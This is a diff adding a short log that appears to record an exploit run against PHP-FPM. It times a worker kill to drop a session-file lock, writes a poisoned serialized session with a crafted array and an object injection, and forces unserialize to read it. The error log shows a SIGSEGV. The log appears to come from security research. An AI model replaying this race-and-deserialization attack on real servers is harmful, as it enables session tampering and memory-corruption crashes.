@@ -1,0 +1,18 @@
+======================================================================
+shape34 mission 4 — flock-drop timing + zero4 session injection
+sid=s344c3cb150d0ae47766c42 session file=/tmp/s34_fpm/sess/sess_s344c3cb150d0ae47766c42
+======================================================================
+[P0] seed: b'35\r\nREAD-OK pid=1962453 sapi=fpm-fcgi handler=php keys=v\n\r\n0\r\n\r\n' (0.007s)
+[P0] file after seed: 14 bytes: b'v|s:5:"legit";'
+[P1] holder: UNEXPECTED completion b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><he'
+[P1] kill request wall: 0.024s (worker died holding flock LOCK_EX)
+[P2] writer: armed=1792873478.498622 acquired=1792873478.498854 done=1792873478.501971 polls=1 fail=None
+[P2] WINDOW RECEIPT: lock acquired -424.726 ms after kill-request completion (dropped flock won in-window)
+[P2] poison on disk: 10148 bytes head=b'q|a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:' tail=b':1017;i:1;i:9998;O:19:"Shape34_JobEnvelope":0:{}i:9998;i:5;}'
+[P3] poisoned read on the same sid (session decode = unserialize):
+[P3] read: COMPLETED b'35\r\nREAD-OK pid=1962453 sapi=fpm-fcgi handler=php keys=q\n\r\n0\r\n\r\n' (0.01s)
+
+--- FPM error log kill lines:
+     [24-Oct-2026 15:24:38] WARNING: [pool www] child 1962454 exited on signal 11 (SIGSEGV) after 8.369286 seconds from start
+
+DONE shape34_fpm_chain sid=s344c3cb150d0ae47766c42
